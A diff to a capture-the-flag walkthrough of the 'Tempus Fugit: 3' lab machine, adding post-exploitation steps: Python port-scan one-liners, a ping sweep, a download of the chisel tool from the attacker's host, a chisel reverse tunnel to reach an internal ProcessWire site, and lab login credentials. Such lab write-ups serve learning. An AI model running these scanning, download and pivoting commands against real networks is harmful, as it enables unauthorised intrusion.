@@ -1,4 +1,4 @@
-<img width="452" height="215" alt="image" src="https://github.com/user-attachments/assets/6c311d46-e9b0-4964-a16e-f605cd6b025c" /># Tempus Fugit: 3 Walkthrough
+<img width="1217" height="466" alt="image" src="https://github.com/user-attachments/assets/526d1b2c-c6c0-4cd6-b9d6-fe5e27a76f63" /># Tempus Fugit: 3 Walkthrough
 # Description
 ```bash
 Tempus Fugit is a Latin phrase that roughly translated as “time flies”.
@@ -272,4 +272,73 @@ Actually in the page source there was another string
 <img width="1263" height="160" alt="image" src="https://github.com/user-attachments/assets/35f03b04-1a95-4ff7-93a6-47de17f1b640" />
 \
 <img width="1074" height="52" alt="image" src="https://github.com/user-attachments/assets/7c29b10f-c471-49bd-92eb-a42f2203e712" />
+\
+Then i used a mini python script to check which all ports are open on current host , since most common binaries were not installed on the system
+```bash
+www-data@TF3:/tmp$ python
+Python 3.6.9 (default, Sep 12 2019, 16:33:49) 
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import socket
+>>> [print(f"Port {p}: OPEN") for p in range(1, 65536) if not socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex(('127.0.0.1', p))]
+Port 80: OPEN
+Port 37860: OPEN
+[None, None]
+```
+\
+Then i transferred fiels using pythons urllib module
+```bash
+www-data@TF3:/tmp$ python
+Python 3.6.9 (default, Sep 12 2019, 16:33:49) 
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import urllib.request
+>>> urllib.request.urlretrieve('http://192.168.0.124:9000/chisel_1.11.3_linux_amd64', 'chisel')
+('chisel', <http.client.HTTPMessage object at 0x7fa8f39825f8>)
+>>> exit()
+```
+\
+But no use
+\
+Then i tried to find out all the devices in the network 192.168.100.x (since we found this subnet ip in /etc/hosts file)
+```bash
+for i in {1..254}; do ping -c 1 -W 1 192.168.100.$i >/dev/null && echo "192.168.100.$i is alive" & done
+```
+\
+Got 192.168.100.1 and 192.168.100.100, so i used python 1 liner to find open ports
+```bash
+www-data@TF3:/tmp$ python -c "import socket;s=socket.socket;exec('for p in range(1,65536):\\n try:\\n  sock=socket.socket();sock.settimeout(0.5);sock.connect((\\\"192.168.100.1\\\",p));print(f\\\"Port {p}: OPEN\\\");sock.close()\\n except:pass')"
+Port 80: OPEN
+Port 443: OPEN
+Port 45599: OPEN
+www-data@TF3:/tmp$ python -c "import socket;s=socket.socket;exec('for p in range(1,65536):\\n try:\\n  sock=socket.socket();sock.settimeout(0.5);sock.connect((\\\"192.168.100.100\\\",p));print(f\\\"Port {p}: OPEN\\\");sock.close()\\n except:pass')"
+Port 80: OPEN
+Port 57890: OPEN
+```
+\
+Then i was checking all the ports 1 by 1 , when i found a new website running on port 443 of 192.168.100.1
+```bash
+www-data@TF3:/tmp$ ./chisel client 192.168.0.124:9001 R:9999:192.168.100.1:443
+2026/04/24 11:14:11 client: Connecting to ws://192.168.0.124:9001
+2026/04/24 11:14:11 client: Connected (Latency 882.776µs)
+```
+\
+<img width="1641" height="738" alt="image" src="https://github.com/user-attachments/assets/49f747bf-663c-49fe-9336-d8e42a2944b1" />
+\
+After scrolling down , we see that it is some processwire cms
+\
+<img width="1027" height="600" alt="image" src="https://github.com/user-attachments/assets/32c70c54-1740-4219-aa51-47216f1aa6b1" />
+\
+Login page 
+\
+<img width="1217" height="466" alt="image" src="https://github.com/user-attachments/assets/6445b411-be0e-4352-826e-4f34717213df" />
+\
+And since the papragraph before said "under the supervision of Hugh"
+\
+I tried the previous known credentials , but didnt work , so after some hint , i used the creds
+```bash
+admin : S0secretPassW0rd
+```
+\
+<img width="1707" height="631" alt="image" src="https://github.com/user-attachments/assets/d520050c-496e-436f-857d-67d0f6faf930" />
 \
